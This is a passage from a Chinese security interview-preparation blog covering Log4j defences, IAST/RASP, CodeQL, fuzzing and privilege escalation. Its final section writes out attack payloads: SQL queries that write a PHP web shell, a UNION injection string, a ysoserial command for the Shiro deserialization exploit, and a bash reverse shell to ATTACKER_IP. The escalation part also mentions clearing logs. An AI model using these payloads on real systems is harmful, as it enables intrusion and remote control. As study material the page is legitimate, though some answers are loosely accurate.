class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> detectClass(<span class="string">&quot;org.apache.log4j.Logger&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Log4j exists: &quot;</span> + exists);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>依赖管理工具</strong>：使用如Maven、Gradle等工具来列出所有依赖项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Maven命令</span></span><br><span class="line">mvn dependency:tree</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反序列化炸弹检测</strong>：</p>
<ul>
<li><strong>异常检测</strong>：监控反序列化过程中的异常行为。</li>
<li><strong>数据流分析</strong>：分析反序列化数据的来源和流向，识别潜在的风险。</li>
<li><strong>示例代码</strong>：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationDetector</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;suspected.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="comment">// 检测反序列化后的对象</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> SuspiciousClass) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Detected deserialization bomb!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="浏览器多窗口和多标签的设计"><a href="#浏览器多窗口和多标签的设计" class="headerlink" title="浏览器多窗口和多标签的设计"></a>浏览器多窗口和多标签的设计</h3><ul>
<li><strong>多窗口</strong>：通常属于多进程设计，每个窗口运行在独立的进程中，以提高稳定性和安全性。</li>
<li><strong>多标签</strong>：通常属于多线程设计，同一窗口内的多个标签共享一个进程，但通过独立的线程来隔离不同的网页内容。</li>
<li><strong>设计原因</strong>：<ul>
<li><strong>性能</strong>：多进程设计可以防止一个窗口崩溃影响其他窗口。</li>
<li><strong>资源隔离</strong>：多线程设计可以在同一窗口内高效地管理多个标签，减少内存占用。</li>
<li><strong>安全性</strong>：隔离不同的网页内容，防止跨标签攻击。</li>
</ul>
</li>
</ul>
<h3 id="从agent到字节码hook的整个流程（伪代码）"><a href="#从agent到字节码hook的整个流程（伪代码）" class="headerlink" title="从agent到字节码hook的整个流程（伪代码）"></a>从agent到字节码hook的整个流程（伪代码）</h3><ol>
<li><strong>注册JVM初始化事件</strong>：在JVM启动时，通过<code>Agent_OnLoad</code>函数注册初始化事件监听器。</li>
<li><strong>初始化完成后注册类转换器</strong>：在JVM初始化完成后，注册一个<code>ClassFileTransformer</code>，用于在类加载时修改字节码。</li>
<li><strong>修改字节码</strong>：在<code>transform</code>方法中，使用ASM等字节码操作库对目标类的字节码进行修改，插入监控或安全检查代码。</li>
<li><strong>返回修改后的字节码</strong>：将修改后的字节码返回给JVM，JVM会使用这个修改后的字节码来创建类的实例。</li>
</ol>
<p>伪代码示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">ClassFileTransformer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                    Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                    <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">                <span class="comment">// 使用ASM等库修改字节码</span></span><br><span class="line">                <span class="keyword">return</span> modifyClassFile(className, classfileBuffer);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] modifyClassFile(String className, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="comment">// 使用ASM等库进行字节码修改的逻辑</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> modifiedClassfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="log4j有哪些防御方法技术层面"><a href="#log4j有哪些防御方法技术层面" class="headerlink" title="log4j有哪些防御方法技术层面"></a>log4j有哪些防御方法技术层面</h3><ol>
<li><strong>升级Log4j版本</strong>：升级到Log4j 2.17.1或更高版本，这些版本修复了已知的安全漏洞。</li>
<li><strong>禁用JNDI功能</strong>：通过设置系统属性<code>log4j2.formatMsgNoLookups=true</code>来禁用JNDI功能，防止远程代码执行。</li>
<li><strong>移除JNDI支持模块</strong>：从Log4j的JAR文件中移除JNDI相关的类文件，如<code>JndiManager.class</code>。</li>
<li><strong>使用WAF进行防护</strong>：在Web应用防火墙（WAF）中配置规则，拦截包含<code>$&#123;jndi:&#125;</code>模式的请求。</li>
<li><strong>监控和日志分析</strong>：实时监控应用日志，及时发现和响应潜在的攻击行为。</li>
</ol>
<h3 id="谈一下CodeQL，能不能用来做CI-CD"><a href="#谈一下CodeQL，能不能用来做CI-CD" class="headerlink" title="谈一下CodeQL，能不能用来做CI&#x2F;CD"></a>谈一下CodeQL，能不能用来做CI&#x2F;CD</h3><p>CodeQL是一种强大的代码分析工具，可以用于CI&#x2F;CD流程中。它能够静态分析代码，检测潜在的安全漏洞和代码质量问题。在CI&#x2F;CD中，可以将CodeQL集成到构建流程中，自动运行分析任务，并在发现问题时触发警报或阻止构建通过。这样可以在早期阶段发现和修复问题，提高代码质量。</p>
<h3 id="CodeQL哪些地方会断，该怎么处理"><a href="#CodeQL哪些地方会断，该怎么处理" class="headerlink" title="CodeQL哪些地方会断，该怎么处理"></a>CodeQL哪些地方会断，该怎么处理</h3><ol>
<li><strong>路径爆炸</strong>：当分析的路径过多时，可能导致分析性能下降。可以通过设置<code>--max-paths</code>参数来限制分析的路径数量。</li>
<li><strong>内存溢出</strong>：分析大型代码库时可能会出现内存不足的情况。可以增加分配给CodeQL的内存，或者优化查询以减少内存使用。</li>
<li><strong>误报</strong>：CodeQL可能会报告一些误报。可以通过自定义查询或使用<code>@suppress</code>注释来标记和过滤误报。</li>
</ol>
<h3 id="说一下SAST、DAST、IAST的优缺点"><a href="#说一下SAST、DAST、IAST的优缺点" class="headerlink" title="说一下SAST、DAST、IAST的优缺点"></a>说一下SAST、DAST、IAST的优缺点</h3><table>
<thead>
<tr>
<th>工具类型</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>SAST（静态应用安全测试）</td>
<td>1. 无需运行应用，可在编码阶段早期发现漏洞。2. 可以检测到代码中的潜在逻辑漏洞。3. 有助于提高代码质量。</td>
<td>1. 需要访问源代码。2. 可能产生较多误报。3. 部署成本较高。</td>
</tr>
<tr>
<td>DAST（动态应用安全测试）</td>
<td>1. 不需要源代码，可在运行时检测实际漏洞。2. 能够发现运行时特定的漏洞。3. 部署相对简单。</td>
<td>1. 无法检测到代码中的逻辑漏洞。2. 可能错过未被测试到的攻击面。3. 误报率相对较高。</td>
</tr>
<tr>
<td>IAST（交互式应用安全测试）</td>
<td>1. 结合了SAST和DAST的优点，可在运行时检测并关联代码中的漏洞。2. 能够提供更准确的漏洞定位和修复建议。3. 适合复杂应用的安全测试。</td>
<td>1. 需要插桩，部署成本较高。2. 对运行环境有一定依赖。3. 可能对应用性能产生一定影响。</td>
</tr>
</tbody></table>
<h3 id="介绍下DevSecOps"><a href="#介绍下DevSecOps" class="headerlink" title="介绍下DevSecOps"></a>介绍下DevSecOps</h3><p>DevSecOps是一种将安全融入DevOps流程的实践，强调在软件开发生命周期的每个阶段都考虑安全问题。其核心理念是安全不再是单独的阶段，而是贯穿整个开发、测试和运维过程。通过自动化工具、持续监控和团队协作，DevSecOps能够帮助组织更快地发现和修复安全问题，提高软件的安全性和可靠性。常见的实践包括使用自动化安全扫描工具、实施最小权限原则、进行安全培训等。</p>
<h3 id="IAST-主动和被动的区别"><a href="#IAST-主动和被动的区别" class="headerlink" title="IAST 主动和被动的区别"></a>IAST 主动和被动的区别</h3><ul>
<li><strong>主动IAST</strong>：需要发包器和agent两部分，发包器负责构造流量，agent负责插桩和捕获流量。主动IAST在关键函数hook到流量后，会添加payload进行扫描，类似黑盒功能，可检测上下文相关漏洞，但会产生脏数据，且性能损耗较大，需适配不同语言框架。</li>
<li><strong>被动IAST</strong>：只需agent部分，通过污点分析技术检测漏洞，不会主动发送payload，无脏数据产生，对业务测试无影响，但无法检测未触发代码路径的漏洞。</li>
</ul>
<h3 id="IAST在CI-CD中的位置"><a href="#IAST在CI-CD中的位置" class="headerlink" title="IAST在CI&#x2F;CD中的位置"></a>IAST在CI&#x2F;CD中的位置</h3><p>IAST可以放在CI&#x2F;CD的测试阶段，也可以放在开发阶段和生产阶段。在测试阶段，IAST可以与自动化测试脚本结合，实时检测漏洞；在开发阶段，可帮助开发人员及时发现和修复漏洞；在生产阶段，可监控运行中的应用程序，及时发现和处理安全问题。</p>
<h3 id="AST的定义"><a href="#AST的定义" class="headerlink" title="AST的定义"></a>AST的定义</h3><p>AST（Abstract Syntax Tree）是抽象语法树，是源代码的抽象表示，它以树状结构展示代码的语法结构，忽略了不必要的细节，如空格、注释等，是编译器和解释器对代码进行分析和处理的基础。</p>
<h3 id="代码生成AST的方法"><a href="#代码生成AST的方法" class="headerlink" title="代码生成AST的方法"></a>代码生成AST的方法</h3><p>以Python为例，可以使用Python的ast模块来生成AST：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def hello_world():</span></span><br><span class="line"><span class="string">    print(&quot;Hello, World!&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = ast.parse(code)</span><br><span class="line"><span class="built_in">print</span>(ast.dump(tree))</span><br></pre></td></tr></table></figure>

<h3 id="不经过IR阶段生成AST的方法及其缺陷"><a href="#不经过IR阶段生成AST的方法及其缺陷" class="headerlink" title="不经过IR阶段生成AST的方法及其缺陷"></a>不经过IR阶段生成AST的方法及其缺陷</h3><ul>
<li><strong>方法</strong>：直接解析源代码生成AST，无需经过中间表示（IR）阶段。例如，使用词法分析器和语法分析器直接从源代码生成AST。</li>
<li><strong>缺陷</strong>：<ul>
<li><strong>性能问题</strong>：直接解析源代码生成AST可能需要更多的计算资源和时间，尤其是在处理复杂代码时。</li>
<li><strong>兼容性问题</strong>：不同编程语言的语法和结构差异较大，直接解析可能需要针对每种语言实现特定的解析器，增加了开发和维护的难度。</li>
<li><strong>扩展性问题</strong>：如果需要对AST进行进一步的处理或优化，直接解析生成的AST可能不够灵活，难以适应不同的需求。</li>
</ul>
</li>
</ul>
<h3 id="HIDS的流程"><a href="#HIDS的流程" class="headerlink" title="HIDS的流程"></a>HIDS的流程</h3><p>HIDS（Host-based Intrusion Detection System）的流程通常包括以下几个步骤：</p>
<ol>
<li><strong>数据收集</strong>：收集系统日志、网络流量、文件系统变化等信息。</li>
<li><strong>数据分析</strong>：对收集到的数据进行分析，检测异常行为和潜在的入侵活动。</li>
<li><strong>响应处理</strong>：根据分析结果采取相应的措施，如发出警报、阻止可疑连接、隔离受感染的系统等。</li>
<li><strong>报告生成</strong>：生成详细的报告，记录检测到的事件和采取的措施，以便后续的审计和分析。</li>
</ol>
<h3 id="提权的方法"><a href="#提权的方法" class="headerlink" title="提权的方法"></a>提权的方法</h3><ul>
<li><strong>suid提权</strong>：利用具有suid权限的程序，通过构造特定的输入或利用程序中的漏洞，使普通用户能够以root权限执行代码，从而提升权限。</li>
<li><strong>MySQL提权</strong>：通过利用MySQL的某些特性或漏洞，如文件写入、命令执行等，获取更高的权限。</li>
</ul>
<h3 id="suid提权的生命周期"><a href="#suid提权的生命周期" class="headerlink" title="suid提权的生命周期"></a>suid提权的生命周期</h3><p>suid提权的生命周期包括以下几个阶段：</p>
<ol>
<li><strong>发现suid文件</strong>：查找系统中具有suid权限的文件。</li>
<li><strong>分析漏洞</strong>：分析这些文件是否存在可利用的漏洞。</li>
<li><strong>构造利用</strong>：根据漏洞构造相应的利用代码或输入。</li>
<li><strong>获取权限</strong>：执行利用代码，提升权限。</li>
<li><strong>清理痕迹</strong>：删除日志、恢复系统状态等，避免被发现。</li>
</ol>
<h3 id="Windows-烂土豆"><a href="#Windows-烂土豆" class="headerlink" title="Windows 烂土豆"></a>Windows 烂土豆</h3><p>Windows 烂土豆（Windows Privilege Escalation）是一种利用Windows系统中的权限提升技术的手段。它通常涉及利用系统中的漏洞、配置错误或特定的程序行为来提升用户的权限，从而获得更高的访问权限。常见的Windows提权方法包括利用服务权限、DLL注入、令牌窃取等。</p>
<h3 id="IAST和RASP的区别"><a href="#IAST和RASP的区别" class="headerlink" title="IAST和RASP的区别"></a>IAST和RASP的区别</h3><ul>
<li><strong>定义与工作原理</strong>：<ul>
<li><strong>IAST（Interactive Application Security Testing）</strong>：是一种结合了SAST和DAST优点的安全测试技术，通过在应用程序中植入探针，在运行时动态地监测和报告安全漏洞。它可以在测试阶段对应用程序进行安全检测，识别出SAST和DAST工具可能遗漏的安全漏洞。</li>
<li><strong>RASP（Runtime Application Self-Protection）</strong>：是一种应用程序保护技术，它在应用程序运行时监视和保护应用程序免受攻击。RASP使用运行时上下文信息和安全策略来检测和防止攻击，并且可以主动响应和阻止潜在的安全威胁。</li>
</ul>
</li>
<li><strong>使用场景</strong>：<ul>
<li><strong>IAST</strong>：主要用于应用上线前的测试阶段，帮助开发团队在开发过程中尽早发现和修复安全漏洞，降低后期修复成本和风险。</li>
<li><strong>RASP</strong>：主要用于生产环境，为已经上线的应用程序提供实时的保护，能够及时发现并阻断攻击，减少安全事件的发生。</li>
</ul>
</li>
<li><strong>检测粒度</strong>：<ul>
<li><strong>IAST</strong>：更关注于代码层面的安全漏洞检测，能够精确到具体的代码行或函数调用，为开发人员提供详细的漏洞信息和修复建议。</li>
<li><strong>RASP</strong>：更关注于应用程序运行时的行为和状态，检测范围更广泛，包括应用程序的运行时上下文、系统调用、网络通信等，能够识别和阻止各种攻击行为。</li>
</ul>
</li>
<li><strong>性能影响</strong>：<ul>
<li><strong>IAST</strong>：在测试阶段运行，对应用程序性能的影响相对较小，因为测试环境通常不会对性能有极高的要求。</li>
<li><strong>RASP</strong>：在生产环境中运行，会对应用程序性能产生一定的影响，但一般在可接受范围内，如RASP带来的性能消耗一般在5%~10%之间。</li>
</ul>
</li>
<li><strong>误报和漏报率</strong>：<ul>
<li><strong>IAST</strong>：由于其检测粒度较细，可能会存在一定的误报和漏报情况，需要开发人员对检测结果进行分析和确认。</li>
<li><strong>RASP</strong>：通过运行时上下文的分析和判断，能够更准确地识别攻击行为，误报和漏报率相对较低。</li>
</ul>
</li>
</ul>
<h3 id="IAST和RASP在埋点深浅上的处理"><a href="#IAST和RASP在埋点深浅上的处理" class="headerlink" title="IAST和RASP在埋点深浅上的处理"></a>IAST和RASP在埋点深浅上的处理</h3><ul>
<li><strong>IAST</strong>：埋点相对较浅，主要是在应用程序的关键函数或模块中插入探针，以收集运行时的数据和信息，用于漏洞检测。例如，在处理用户输入的函数、数据库操作函数等处进行埋点，监测数据的流向和操作行为，以发现潜在的注入漏洞、跨站脚本漏洞等。</li>
<li><strong>RASP</strong>：埋点较深，不仅在应用程序的函数和模块层面进行监测，还会深入到系统调用、网络通信等底层层面。例如，对操作系统的API调用进行监控，检测是否有异常的文件访问、进程创建等行为；对网络数据包进行分析，识别是否存在恶意的攻击流量。</li>
</ul>
<h3 id="埋点深浅对检出率的影响"><a href="#埋点深浅对检出率的影响" class="headerlink" title="埋点深浅对检出率的影响"></a>埋点深浅对检出率的影响</h3><ul>
<li><strong>埋点浅</strong>：优点是性能影响小，不会对应用程序的正常运行造成太大负担；缺点是检测范围有限，可能无法发现一些深层次的、隐藏的漏洞或攻击行为，检出率相对较低。</li>
<li><strong>埋点深</strong>：能够更全面地监测应用程序的运行状态和行为，检测到更多潜在的安全问题，提高检出率；但同时也会增加性能开销，对应用程序的运行效率产生一定影响。</li>
</ul>
<h3 id="log4j做埋点的两种方式及其区别"><a href="#log4j做埋点的两种方式及其区别" class="headerlink" title="log4j做埋点的两种方式及其区别"></a>log4j做埋点的两种方式及其区别</h3><ul>
<li><strong>直接在log4j的Class里做hook</strong>：<ul>
<li><strong>优点</strong>：可以全面地监控log4j的所有日志记录操作，能够及时发现任何通过log4j输出的恶意日志信息，如包含恶意payload的日志记录。</li>
<li><strong>缺点</strong>：可能会产生较多的误报，因为并非所有的日志记录操作都是攻击行为；而且对log4j的性能可能会有一定影响，尤其是在日志记录频繁的情况下。</li>
</ul>
</li>
<li><strong>直接hook jndi的initial和lookup</strong>：<ul>
<li><strong>优点</strong>：更精准地针对log4j漏洞的利用方式进行监测，能够有效识别和阻断利用jndi进行的恶意远程代码执行攻击，减少误报。</li>
<li><strong>缺点</strong>：可能会遗漏一些通过其他方式利用log4j漏洞的攻击行为，检测范围相对较窄。</li>
</ul>
</li>
</ul>
<h3 id="百度的IAST实现及主动式和被动式的区别"><a href="#百度的IAST实现及主动式和被动式的区别" class="headerlink" title="百度的IAST实现及主动式和被动式的区别"></a>百度的IAST实现及主动式和被动式的区别</h3><ul>
<li><strong>百度的IAST</strong>：百度的IAST解决方案结合了动态污点追踪技术，在应用程序运行时对数据流进行监测和分析，能够准确地识别出漏洞的利用路径和影响范围。它通过在应用程序中植入探针，收集运行时的数据和信息，然后利用污点传播模型进行分析，判断是否存在安全漏洞。</li>
<li><strong>主动式和被动式的区别</strong>：<ul>
<li><strong>主动式</strong>：主动式IAST会主动向应用程序发送测试请求，模拟各种攻击行为，以检测应用程序是否存在漏洞。这种方式能够更全面地覆盖应用程序的功能和代码路径，提高漏洞的检出率，但可能会对应用程序的性能产生一定影响，且需要一定的测试环境和资源支持。</li>
<li><strong>被动式</strong>：被动式IAST主要是通过监测应用程序的正常运行流量和行为，分析其中是否存在异常或潜在的漏洞利用行为。它对应用程序的性能影响较小，但检测范围和精度可能不如主动式IAST，可能会存在一定的漏报情况。</li>
</ul>
</li>
</ul>
<h3 id="IAST和RASP是否会产生脏数据"><a href="#IAST和RASP是否会产生脏数据" class="headerlink" title="IAST和RASP是否会产生脏数据"></a>IAST和RASP是否会产生脏数据</h3><ul>
<li><strong>IAST</strong>：在测试阶段运行，主要关注于漏洞的检测和发现，不会对应用程序的正常数据和业务逻辑产生影响，因此一般不会产生脏数据。</li>
<li><strong>RASP</strong>：在生产环境中运行，会对应用程序的行为进行监控和干预，可能会对一些正常的业务操作产生误判，导致阻断或修改正常的请求和数据，从而产生脏数据。但优秀的RASP产品会通过精确的检测算法和策略，尽量减少误判和脏数据的产生。</li>
</ul>
<h3 id="符号执行及约束求解"><a href="#符号执行及约束求解" class="headerlink" title="符号执行及约束求解"></a>符号执行及约束求解</h3><ul>
<li><strong>符号执行</strong>：是一种程序分析技术，它将程序的输入表示为符号而不是具体的值，然后通过符号执行引擎对程序进行模拟执行，跟踪程序的执行路径和状态变化，以发现潜在的漏洞和错误。在符号执行过程中，会根据程序的逻辑和约束条件，建立符号约束表达式，当需要确定某个路径是否可达或某个条件是否成立时，就需要进行约束求解。</li>
<li><strong>约束求解</strong>：约束求解器会根据符号约束表达式，寻找满足条件的输入值或证明无解。例如，在分析一个存在缓冲区溢出漏洞的程序时，符号执行引擎会跟踪输入数据在缓冲区中的写入操作，建立关于输入长度和缓冲区大小的约束表达式，约束求解器会尝试找到使输入长度超过缓冲区大小的输入值，从而确定漏洞的存在。</li>
</ul>
<h3 id="可用Fuzz检测的漏洞类型"><a href="#可用Fuzz检测的漏洞类型" class="headerlink" title="可用Fuzz检测的漏洞类型"></a>可用Fuzz检测的漏洞类型</h3><ul>
<li><strong>缓冲区溢出漏洞</strong>：通过向程序输入大量数据，使其超过缓冲区的容量，导致程序崩溃或执行任意代码。Fuzz测试可以生成各种长度和内容的输入数据，模拟这种溢出情况，检测程序是否存在缓冲区溢出漏洞。</li>
<li><strong>SQL注入漏洞</strong>：通过向程序输入恶意的SQL语句，干扰数据库的正常运行。Fuzz测试可以生成各种包含特殊字符、SQL关键字等的输入，尝试注入到程序的查询语句中，检测是否存在SQL注入漏洞。</li>
<li><strong>跨站脚本攻击（XSS）漏洞</strong>：通过向网页输入恶意的脚本代码，使其在其他用户的浏览器中执行。Fuzz测试可以生成各种包含HTML标签、脚本代码等的输入，模拟用户输入到网页表单或URL参数中，检测是否存在XSS漏洞。</li>
<li><strong>命令注入漏洞</strong>：通过向程序输入恶意的命令，使其在服务器上执行。Fuzz测试可以生成各种包含操作系统命令、特殊字符等的输入，尝试注入到程序的命令执行函数中，检测是否存在命令注入漏洞。</li>
<li><strong>文件包含漏洞</strong>：通过向程序输入恶意的文件路径，使其包含并执行指定的文件。Fuzz测试可以生成各种包含绝对路径、相对路径、网络路径等的输入，尝试包含到程序的文件包含函数中，检测是否存在文件包含漏洞。</li>
</ul>
<h2 id="携程"><a href="#携程" class="headerlink" title="携程"></a>携程</h2><p>以下是对这些问题的详细解答，包含技术细节和代码示例：</p>
<hr>
<h3 id="1-SQL-注入写马"><a href="#1-SQL-注入写马" class="headerlink" title="1. SQL 注入写马"></a><strong>1. SQL 注入写马</strong></h3><h4 id="outfile-和-dumpfile-的区别"><a href="#outfile-和-dumpfile-的区别" class="headerlink" title="outfile 和 dumpfile 的区别"></a><strong><code>outfile</code> 和 <code>dumpfile</code> 的区别</strong></h4><ul>
<li>**<code>outfile</code>**：支持多行写入，可以自定义编码（如 Base64），但需要目标服务器有写权限。</li>
<li>**<code>dumpfile</code>**：只能写单行数据，且不支持编码，但可以绕过某些 WAF。</li>
</ul>
<h4 id="示例：利用-outfile-写-Webshell"><a href="#示例：利用-outfile-写-Webshell" class="headerlink" title="示例：利用 outfile 写 Webshell"></a><strong>示例：利用 <code>outfile</code> 写 Webshell</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="示例：利用-dumpfile-写单行"><a href="#示例：利用-dumpfile-写单行" class="headerlink" title="示例：利用 dumpfile 写单行"></a><strong>示例：利用 <code>dumpfile</code> 写单行</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E</span> </span><br><span class="line"><span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-宽字符截断的原理"><a href="#2-宽字符截断的原理" class="headerlink" title="2. 宽字符截断的原理"></a><strong>2. 宽字符截断的原理</strong></h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>宽字符截断利用字符编码差异（如 UTF-8 和 GBK），通过截断字符绕过单引号限制。</p>
<h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a><strong>示例</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; /*!UNION*/ SELECT 1, 2, 3, 0x61646d696e FROM users--</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x61646d696e</code> 是 <code>admin</code> 的十六进制编码。</li>
<li>通过宽字符截断绕过单引号限制。</li>
</ul>
<hr>
<h3 id="3-SSRF-无回显的利用"><a href="#3-SSRF-无回显的利用" class="headerlink" title="3. SSRF 无回显的利用"></a><strong>3. SSRF 无回显的利用</strong></h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>无回显时，通过盲注判断请求是否成功（如 HTTP 状态码或响应时间）。</p>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h4><ul>
<li><strong>Burp Suite</strong>：构造请求，监控响应。</li>
<li><strong>Nuclei</strong>：自动化扫描 SSRF 漏洞。</li>
</ul>
<h4 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a><strong>示例</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/api?target=http://internal-service&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Service Unavailable&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SSRF 利用成功&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-Shiro-漏洞"><a href="#4-Shiro-漏洞" class="headerlink" title="4. Shiro 漏洞"></a><strong>4. Shiro 漏洞</strong></h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>Apache Shiro 存在反序列化漏洞（如 <code>rememberMe</code> Cookie），可执行任意代码。</p>
<h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a><strong>利用</strong></h4><ul>
<li><strong>工具</strong>：<code>ysoserial</code> 生成 payload。</li>
<li><strong>示例</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 <span class="string">&quot;calc&quot;</span> &gt; payload.ser</span><br></pre></td></tr></table></figure>
将 <code>payload.ser</code> 编码为 Base64，注入到 <code>rememberMe</code> Cookie 中。</li>
</ul>
<h4 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a><strong>失败原因</strong></h4><ol>
<li>Shiro 版本不受影响。</li>
<li>未启用 <code>rememberMe</code> 功能。</li>
<li>环境缺少依赖（如 <code>commons-collections</code>）。</li>
</ol>
<hr>
<h3 id="5-反弹-Shell-的本质"><a href="#5-反弹-Shell-的本质" class="headerlink" title="5. 反弹 Shell 的本质"></a><strong>5. 反弹 Shell 的本质</strong></h3><p>反弹 Shell 是通过建立反向连接，将目标机器的控制权转移到攻击者的机器。</p>
<h4 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a><strong>示例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击者监听</span></span><br><span class="line">nc -lvnp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机器执行</span></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>

<hr>
